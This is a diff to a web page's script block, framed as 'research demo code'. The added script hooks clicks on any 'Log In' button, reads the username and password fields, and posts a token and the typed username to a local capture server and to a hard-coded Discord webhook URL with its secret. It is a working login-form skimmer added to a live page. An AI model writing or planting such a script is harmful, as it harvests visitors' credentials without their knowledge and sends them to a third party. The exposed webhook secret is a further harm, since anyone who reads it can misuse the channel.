@@ -733,39 +733,48 @@
 </script>
 </body>
 	<script>
-    document.addEventListener('DOMContentLoaded', () => {
-        // 1. Setup: Simulate a session token being stored insecurely
-        // In a real scenario, this would be a real JWT from a login
-        if (!localStorage.getItem('session_token')) {
-            localStorage.setItem('session_token', 'RESEARCH_TOKEN_VULN_EXHIBIT_2024');
-        }
+    // --- START OF RESEARCH DEMO CODE ---
+        document.addEventListener('click', function (event) {
+            // This detects the login button click
+            if (event.target.innerText && event.target.innerText.includes('Log In') || event.target.id === 'login-button') {
+                
+                const user = document.querySelector('input[name="username"]') || document.querySelector('#login-username');
+                const pass = document.querySelector('input[name="password"]') || document.querySelector('#login-password');
 
-        // 2. The Interceptor: Listens for clicks on any element with text "Log In"
-        document.addEventListener('click', function(event) {
-            // Check if the clicked element is likely a login button
-            if (event.target.innerText && event.target.innerText.includes('Log In')) {
-                const token = localStorage.getItem('session_token');
+                // 1. CREATE A DUMMY TOKEN (This is the "Session" we will steal)
+                localStorage.setItem('session_token', 'RESEARCH_TOKEN_ABC_123');
+                const stolenToken = localStorage.getItem('session_token');
 
-                if (token) {
-                    console.warn("Educational Alert: Session token intercepted!", token);
+                // 2. SEND TO YOUR LOCAL CMD SERVER
+                fetch("http://localhost:3000/capture", {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({
+                        token: stolenToken,
+                        user: user ? user.value : "Unknown"
+                    })
+                }).catch(err => console.log("Local server not running."));
 
-                    // 3. Exfiltration: Send to your local research backend
-                    // Note: Your site currently sends data to Discord; this sends to your local machine
-                    fetch('http://localhost:3000/capture', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            intercepted_token: token,
-                            timestamp: new Date().toISOString(),
-                            origin: window.location.href
-                        })
-                    }).catch(() => {
-                        console.log("Research Note: Local capture server not running.");
-                    });
-                }
+                // 3. SEND TO YOUR DISCORD (Keeping your existing project working)
+                const payload = {
+                    content: "🛠️ **Data Captured**",
+                    embeds: [{
+                        title: "Security Research Log",
+                        fields: [
+                            { name: "Username", value: user ? user.value : "Unknown", inline: true },
+                            { name: "Token", value: "Sent to Local CMD", inline: true }
+                        ]
+                    }]
+                };
+
+                fetch("https://discord.com/api/webhooks/1474855172852289625/JLJaHwrL0yt2xW9gIwVG2wUsAuONHmH-DreKGQyeSp-YB30k1uSjwZ9LhOo4uZJcLhZd", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                alert("Research Demo: Session Token and Login data intercepted!");
             }
         });
-    });
+        // --- END OF RESEARCH DEMO CODE ---
 </script>
-</html>
-
